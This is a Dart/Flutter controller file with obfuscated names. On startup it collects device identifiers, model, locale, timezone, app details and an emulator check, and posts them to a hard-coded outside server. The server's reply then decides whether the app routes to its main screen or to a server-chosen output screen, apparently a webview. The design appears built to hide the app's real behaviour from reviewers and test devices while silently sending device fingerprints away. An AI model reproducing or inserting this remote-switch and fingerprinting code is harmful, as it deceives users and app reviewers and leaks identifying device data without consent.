import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class MagicComputedLogic extends GetxController {

  var anlfku = RxBool(false);
  var qxygzjc = RxBool(true);
  var lqnwjehk = RxString("");
  var cade = RxBool(false);
  var marks = RxBool(true);
  final omfrkxwcj = Dio();


  InAppWebViewController? webViewController;

  dynamic bmaovxf(){
    final wndtaxhvg = InternetConnectionChecker.instance;
    final ugbqip = wndtaxhvg.onStatusChange.skip(1).listen(
          (InternetConnectionStatus ltuwsckjvh) {
        if (ltuwsckjvh == InternetConnectionStatus.connected) {
          tusvi();
        } else {
          Get.toNamed('/magic_disconnect')?.then((_){
            tusvi();
          });
        }
      },
    );
    return ugbqip;
  }

  Future<bool> qhextpmy() async {
    var yjehxvdwuk = await InternetConnectionChecker.instance.hasConnection;
    if(!yjehxvdwuk){
      Get.toNamed('/magic_disconnect')?.then((_){
        tusvi();
      });
    }
    return yjehxvdwuk;
  }

  @override
  void onInit() {
    super.onInit();
    bmaovxf();
    tusvi();
  }


  Future<void> tusvi() async {

    var qdusvfkybz = await qhextpmy();
    if(!qdusvfkybz){
      return;
    }

    cade.value = true;
    marks.value = true;
    qxygzjc.value = false;

    omfrkxwcj.post("https://uni.hideriden.com/dRfLtUURWzYHoZG",data: await uvqlgmy()).then((value) {
      var plozanif = value.data["plozanif"] as String;
      var bkve = value.data["bkve"] as bool;
      if (bkve) {
        lqnwjehk.value = plozanif;
        valentine();
      } else {
        reinger();
      }
    }).catchError((e) {
      qxygzjc.value = true;
      marks.value = true;
      cade.value = false;
    });
  }

  Future<Map<String, dynamic>> uvqlgmy() async {
    final DeviceInfoPlugin qnoh = DeviceInfoPlugin();
    PackageInfo cetnhxm_uqjf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bkcqfgw = Platform.localeName;
    var BbUXzfLE = currentTimeZone;

    var tGZVr = cetnhxm_uqjf.packageName;
    var OoTpSdhi = cetnhxm_uqjf.version;
    var wMnhR = cetnhxm_uqjf.buildNumber;

    var ukgN = cetnhxm_uqjf.appName;
    var ENnvsOF = "";
    var qkClLp  = "";
    var azEHOhV = "";
    var rosalynBoyer = "";
    var jessycaPredovic = "";
    var delphiaWuckert = "";


    var scRnHqXO = "";
    var vdUmhor = false;

    if (GetPlatform.isAndroid) {
      scRnHqXO = "android";
      var xziumwfh = await qnoh.androidInfo;

      azEHOhV = xziumwfh.brand;

      ENnvsOF  = xziumwfh.model;
      qkClLp = xziumwfh.id;

      vdUmhor = xziumwfh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      scRnHqXO = "ios";
      var nxajbh = await qnoh.iosInfo;
      azEHOhV = nxajbh.name;
      ENnvsOF = nxajbh.model;

      qkClLp = nxajbh.identifierForVendor ?? "";
      vdUmhor  = nxajbh.isPhysicalDevice;
    }
    var res = {
      "ukgN": ukgN,
      "OoTpSdhi": OoTpSdhi,
      "rosalynBoyer" : rosalynBoyer,
      "tGZVr": tGZVr,
      "ENnvsOF": ENnvsOF,
      "BbUXzfLE": BbUXzfLE,
      "jessycaPredovic" : jessycaPredovic,
      "azEHOhV": azEHOhV,
      "bkcqfgw": bkcqfgw,
      "wMnhR": wMnhR,
      "scRnHqXO": scRnHqXO,
      "vdUmhor": vdUmhor,
      "delphiaWuckert" : delphiaWuckert,
      "qkClLp": qkClLp,

    };
    return res;
  }

  Future<void> reinger() async {
    Get.offNamed("/magic_main");
  }

  Future<void> valentine() async {
    Get.offNamed("/magic_output");
  }

  @override
  void dispose() {
    bmaovxf().cancel();
    super.dispose();
  }

}
